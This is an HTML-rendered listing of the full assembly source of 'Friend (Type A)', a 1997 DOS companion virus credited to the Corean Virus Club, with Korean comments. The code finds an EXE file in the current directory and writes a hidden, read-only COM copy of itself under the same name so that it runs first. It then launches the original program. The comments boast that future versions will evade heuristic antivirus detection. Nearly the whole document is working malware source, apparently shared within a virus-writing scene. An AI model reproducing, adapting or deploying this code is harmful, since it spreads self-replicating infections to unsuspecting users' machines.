<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>FRIENDA.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                               CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">; Virus Name : Friend (Type A)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Author : Osiris of CVC,Corea</span><span class="sc0">
</span><span class="sc1">; Date : 1997/09/05</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Type : Non-resident Companion</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 비상주 Companion 바이러스이다. 한국산 최초로 자체제작된 산란형 바이러스이다.</span><span class="sc0">
</span><span class="sc1">; 현재 디렉토리에서 1 개의 EXE 파일을 찾아 동일 파일명 COM 파일을 생성해둔다.</span><span class="sc0">
</span><span class="sc1">; 원래 EXE 파일을 수정하지 않으므로 에러가 날 가능성은 거의 없다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 치료는 생성된 COM 파일만 삭제하면 된다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 예전에 짜봤던 산란형 과는 많이 틀리다.</span><span class="sc0">
</span><span class="sc1">; 역시 인공지능 검색에 진단이 되긴 하지만, 앞으로 개량되는 버전은 인공지능검색</span><span class="sc0">
</span><span class="sc1">; 에도 진단이 안될 것이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 항상 첫작품은 실험용이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">

            </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
            </span><span class="sc9">.CODE</span><span class="sc0">

 </span><span class="sc5">PARASIZE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">End_Memory</span><span class="sc4">-</span><span class="sc5">Friend</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

            </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">

 </span><span class="sc5">Friend</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                    </span><span class="sc1">; DTA 구하기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">; DTA 값 저장</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                    </span><span class="sc1">; 새로운 DTA 설정</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDTA</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                    </span><span class="sc1">; EXE 파일 찾기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">              </span><span class="sc1">; 읽기전용/숨김파일</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mask_EXE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Find_repeat</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Execute_EXE</span><span class="sc0">               </span><span class="sc1">; 감염 시킬 파일이 없으면 EXE 실행</span><span class="sc0">

 </span><span class="sc5">Infect_EXE</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDTA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">ChgExt</span><span class="sc0">                    </span><span class="sc1">; EXE -&gt; COM,COM -&gt; EXE</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">                 </span><span class="sc1">; 감염 여부 확인</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDTA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">   </span><span class="sc1">; (COM 파일이 존재 하는가?)</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Drop_COM</span><span class="sc0">                  </span><span class="sc1">; 속성 찾을 수 있으면 감염 된것임</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                   </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find_repeat</span><span class="sc0">

 </span><span class="sc5">Drop_COM</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0">                   </span><span class="sc1">; COM 파일 생성</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011B</span><span class="sc0">             </span><span class="sc1">; 읽기만 가능/숨김</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDTA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; 핸들 얻기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                   </span><span class="sc1">; 파일 닫기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">Execute_EXE</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                        </span><span class="sc1">; 원래 DTA 복구</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Memory</span><span class="sc0">     </span><span class="sc1">; 스택 조정</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                    </span><span class="sc1">; 메모리 조정</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PARASIZE</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Set_env</span><span class="sc0">                   </span><span class="sc1">; 원래 EXE 파일 실행을 위한 환경</span><span class="sc0">
                                            </span><span class="sc1">; 영역 설정</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filename</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">ChgExt</span><span class="sc0">                    </span><span class="sc1">; 확장자 변경</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                  </span><span class="sc1">; 원래 EXE 파일 실행</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Env_Block</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filename</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">                    </span><span class="sc1">; 리턴값 얻기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">Stop_virus</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c00h</span><span class="sc0">                 </span><span class="sc1">; 바이러스 끝내기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 확장자 바꾸기 (EXE -&gt; COM, COM -&gt; EXE)</span><span class="sc0">
</span><span class="sc1">; 입력 SI = 바꾸고자 하는 확장자</span><span class="sc0">

 </span><span class="sc5">ChgExt</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0">                      </span><span class="sc1">; 확장자 바꾸기</span><span class="sc0">

 </span><span class="sc5">Loop_Eof</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">Loop_Eof</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; DI = 확장자 위치</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Ext_COM</span><span class="sc0">        </span><span class="sc1">; SI = COM</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">         </span><span class="sc1">; EXE 파일 인가 ?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">mov_ext</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0005</span><span class="sc0">                   </span><span class="sc1">; SI = EXE</span><span class="sc0">
 </span><span class="sc5">mov_ext</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                     </span><span class="sc1">; 확장자가 COM 이면 EXE 로</span><span class="sc0">
                                            </span><span class="sc1">; EXE 이면 COM 으로 바꾼다.</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">ChgExt</span><span class="sc0">     </span><span class="sc9">Endp</span><span class="sc0">


</span><span class="sc1">; 환영영역에서 재실행에 필요한 정보 얻기</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Set_Env</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">PSP1</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">PSP2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">PSP3</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">

 </span><span class="sc5">Search_RD</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; 다시 실행하기 위해서 필요한 값들을 알아낸다.</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">002Ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; 실행시킨 파일의 이름을 알아낸다.</span><span class="sc0">

 </span><span class="sc5">Search_RD_LOOP</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0">     </span><span class="sc1">; 파일이름전에는 0000이다.</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">Get_FileName</span><span class="sc0">              </span><span class="sc1">; PSP:[002Ch] --&gt; 세그먼트</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Search_RD_LOOP</span><span class="sc0">

 </span><span class="sc5">Get_FileName</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; 현재 실행되는 파일이름</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filename</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">

 </span><span class="sc5">Set_env</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'[Friend] The first Corean Companion virus..'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'(c) 1997/09 Osiris of CVC (Corean Virus Club),Corea'</span><span class="sc0">

</span><span class="sc1">; 재실행을 위한 블럭</span><span class="sc0">
 </span><span class="sc5">ENV_BLOCK</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; 재실행용 블럭</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">PSP1</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">5ch</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">PSP2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">6ch</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">PSP3</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">Ext_COM</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'COM'</span><span class="sc0">                     </span><span class="sc1">; 확장자 COM</span><span class="sc0">
 </span><span class="sc5">Mask_EXE</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                </span><span class="sc1">; 확장자 EXE</span><span class="sc0">

 </span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">Filename</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">85</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; 파일 이름</span><span class="sc0">
 </span><span class="sc5">NewDTA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; DTA</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; 스택</span><span class="sc0">
 </span><span class="sc5">End_Memory</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc9">END</span><span class="sc0">   </span><span class="sc5">Friend</span><span class="sc0">

</span></div></body>
</html>
